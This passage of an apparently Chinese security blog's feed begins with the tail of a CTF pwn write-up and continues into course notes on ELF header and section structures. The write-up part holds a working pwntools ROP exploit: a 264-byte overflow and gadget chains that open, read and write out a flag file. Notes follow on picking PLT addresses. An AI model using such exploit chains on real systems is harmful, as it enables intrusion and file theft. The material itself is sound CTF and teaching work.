class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;xxx&amp;quot;&lt;/span&gt;,xxx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = process(&amp;quot;./rop&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.terminal = [&amp;#x27;tmux&amp;#x27;, &amp;#x27;splitw&amp;#x27;, &amp;#x27;-h&amp;#x27;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh,&amp;quot;b *0x000004013AE&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;poprdi = &lt;span class=&#34;number&#34;&gt;0x0000000000401503&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;poprsi = &lt;span class=&#34;number&#34;&gt;0x0000000000401501&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;popr13 = &lt;span class=&#34;number&#34;&gt;0x00000000004014fe&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scanfaddr = &lt;span class=&#34;number&#34;&gt;0x0000000000401451&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bssaddr = &lt;span class=&#34;number&#34;&gt;0x0000404100&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readaddr = &lt;span class=&#34;number&#34;&gt;0x000000401100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;openaddr = &lt;span class=&#34;number&#34;&gt;0x00000004012C9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeaddr = &lt;span class=&#34;number&#34;&gt;0x000000004010E0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;start = &lt;span class=&#34;number&#34;&gt;0x000401432&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuladdr = &lt;span class=&#34;number&#34;&gt;0x0000000401384&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt; + p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(poprsi)+ p64(bssaddr) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)+p64(vuladdr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt;+p64(poprdi) +  p64(bssaddr) + p64(poprsi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(openaddr)+p64(vuladdr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt;+p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;) + p64(poprsi) + p64(bssaddr) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)+p64(vuladdr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload3 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt;+p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(poprsi) + p64(bssaddr) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) +p64(writeaddr)+p64(vuladdr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#input()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4919&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(&lt;span class=&#34;string&#34;&gt;&amp;quot;flag&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#  不能用sendline 会有\n&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;细节注意&#34;&gt;&lt;a href=&#34;#细节注意&#34; class=&#34;headerlink&#34; title=&#34;细节注意&#34;&gt;&lt;/a&gt;细节注意&lt;/h1&gt;&lt;h2 id=&#34;open-write-read函数选择&#34;&gt;&lt;a href=&#34;#open-write-read函数选择&#34; class=&#34;headerlink&#34; title=&#34;open write read函数选择&#34;&gt;&lt;/a&gt;open write read函数选择&lt;/h2&gt;&lt;p&gt;​		一开始选的是 .text:0000000000401313 E8 B1 FF FF FF call sys_open ,这肯定是不对的,因为这里的话,控制流到了这里,执行完call没有ret会继续往下执行,就乱套了,&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040130C                 lea     rdi, aGiftsTxt  ; &amp;quot;./gifts.txt&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401313                 call    sys_open&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401318                 mov     [rbp+fd], eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040131B                 lea     rax, [rbp+s]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401322                 mov     edx, 1000h      ; n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401327                 mov     esi, 0          ; c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040132C                 mov     rdi, rax        ; s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040132F                 call    _memset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401334                 lea     rcx, [rbp+s]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040133B                 mov     eax, [rbp+fd]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040133E                 mov     edx, 1000h      ; nbytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401343                 mov     rsi, rcx        ; buf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401346                 mov     edi, eax        ; fd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401348                 call    _read&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040134D                 test    rax, rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401350                 jns     short loc_401368&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401352                 lea     rdi, aReadError ; &amp;quot;read error&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401359                 call    _puts&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040135E                 mov     edi, 1          ; status&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401363                 call    __exit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		应该调用plt这个,这个调用完之后会ret返回&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401100 _read           proc near               ; CODE XREF: some_gifts+59↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401100                                         ; vuln+23↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401100                 endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401104                 bnd jmp cs:off_404038&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401104 _read           endp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;send、sendline&#34;&gt;&lt;a href=&#34;#send、sendline&#34; class=&#34;headerlink&#34; title=&#34;send、sendline&#34;&gt;&lt;/a&gt;send、sendline&lt;/h2&gt;&lt;p&gt;​		sh.send(“flag”) #  不能用sendline 会有\n  第一次read读取flag文件名的时候,不能用sendline,否则会有个回车,就不是正确的文件名了&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-03-17T05:59:53.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/</id>
        <title>ucas-软件安全漏洞分析与发现-elf分析与解析实现</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/"/>
        <content type="html">&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230314100936800.png&#34; alt=&#34;image-20230314100936800&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;一、基础&#34;&gt;&lt;a href=&#34;#一、基础&#34; class=&#34;headerlink&#34; title=&#34;一、基础&#34;&gt;&lt;/a&gt;一、基础&lt;/h1&gt;&lt;h2 id=&#34;ELF文件-整体架构&#34;&gt;&lt;a href=&#34;#ELF文件-整体架构&#34; class=&#34;headerlink&#34; title=&#34;ELF文件 整体架构&#34;&gt;&lt;/a&gt;ELF文件 整体架构&lt;/h2&gt;&lt;p&gt;​	elf文件主要分了几部分:头部、程序头、节表头以及各种节.&lt;/p&gt;
&lt;p&gt;​	elf头部中存储了程序头和节表头的位置,节头中又存储了各个节的位置,以此进行索引.&lt;/p&gt;
&lt;p&gt;​	所以可以回答第2个问题的一部分, 这些节(我认为题目应该说的是节的意思, 段和节经常混用) 在ELF中的位置是可以任意调换的,因为在头部中指定了它们的位置,只要索引信息没问题就可以.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img-blog.csdnimg.cn/b285b3b11743431d8141594ad4b3f8de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiN5Lya5YaZ5Luj56CB55qE5Lid5Li9,size_20,color_FFFFFF,t_70,g_se,x_16&#34;&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiN5Lya5YaZ5Luj56CB55qE5Lid5Li9,size_20,color_FFFFFF,t_70,g_se,x_16.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;链接视图与执行时视图&#34;&gt;&lt;a href=&#34;#链接视图与执行时视图&#34; class=&#34;headerlink&#34; title=&#34;链接视图与执行时视图&#34;&gt;&lt;/a&gt;链接视图与执行时视图&lt;/h2&gt;&lt;p&gt;​		elf静态文件是链接视图,当加载到内存后,会有些许变化.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322090941304.png&#34; alt=&#34;image-20230322090941304&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		在链接视图中,节表是必须的,需要根据它来定位各个节,以及保存节的属性,而程序头表则是可选的,程序头表的内容是加载进内存后的属性(&lt;font color=&#34;red&#34;&gt;是否可选要看该文件的类型??&lt;/font&gt;).&lt;/p&gt;
&lt;p&gt;​		在执行视图中,程序头表是必须的,节表就是可选的了.&lt;/p&gt;
&lt;p&gt;​		在静态文件中,有各种不一样的程序的节(section),比如.text节 .bss节,在加载进内存后,&lt;code&gt;加载器&lt;/code&gt;会将相同的节属性（比如只读）合并一个段(segment)&lt;/p&gt;
&lt;h2 id=&#34;ELF文件头-ehdr&#34;&gt;&lt;a href=&#34;#ELF文件头-ehdr&#34; class=&#34;headerlink&#34; title=&#34;ELF文件头 ehdr&#34;&gt;&lt;/a&gt;ELF文件头 ehdr&lt;/h2&gt;&lt;p&gt;​		详细内容:&lt;a href=&#34;https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html&#34;&gt;https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		结构体定义如下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#define EI_NIDENT 16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef struct &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        unsigned char   e_ident[EI_NIDENT];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_type;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_machine;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Word      e_version;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Addr      e_entry;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Off       e_phoff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Off       e_shoff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Word      e_flags;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_ehsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_phentsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_phnum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_shentsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_shnum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_shstrndx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf32_Ehdr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_type;			/* Object file type */ elf文件类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_machine;		/* Architecture */    CPU架构&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Word	e_version;		/* Object file version */  指定ELF版本,一般都为1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Addr	e_entry;		/* Entry point virtual address */  代码运行的入口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Off	e_phoff;		/* Program header table file offset */  程序头表在文件中的偏移&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Off	e_shoff;		/* Section header table file offset */	节头表在文件中的偏移&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Word	e_flags;		/* Processor-specific flags */	在e_machine指定的处理器下的一些特性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_ehsize;		/* ELF header size in bytes */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_phentsize;		/* Program header table entry size */	程序头表每个条目的大小&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_phnum;		/* Program header table entry count */		程序头表中条目的树木&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_shentsize;		/* Section header table entry size */	节头表每个条目的大小&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_shnum;		/* Section header table entry count */		节头表中条目的数量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_shstrndx;		/* Section header string table index */  每个节都有一个名称,这些名称存储在.shstrtab节中,e_shstrndx指定这个特殊的节所在节头表的下表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf64_Ehdr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		可以用010editor加载插件后清晰的看到结构(需要在templates里面安装和加载一下elf模版)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322094455562.png&#34; alt=&#34;image-20230322094455562&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;e-ident&#34;&gt;&lt;a href=&#34;#e-ident&#34; class=&#34;headerlink&#34; title=&#34;e_ident&#34;&gt;&lt;/a&gt;e_ident&lt;/h3&gt;&lt;p&gt;​		一个16字节大小的数组&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322094613842.png&#34; alt=&#34;image-20230322094613842&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	这个下标范围标错了吧….&lt;/p&gt;
&lt;h2 id=&#34;ELF节表头-shdr&#34;&gt;&lt;a href=&#34;#ELF节表头-shdr&#34; class=&#34;headerlink&#34; title=&#34;ELF节表头 shdr&#34;&gt;&lt;/a&gt;ELF节表头 shdr&lt;/h2&gt;&lt;p&gt;​		e_shoff是 0x19a8(小端)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322100247070.png&#34; alt=&#34;image-20230322100247070&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		可以看到0x19a8开始,存储的是各个节的内容&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322100349315.png&#34; alt=&#34;image-20230322100349315&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		结构如下&lt;/p&gt;
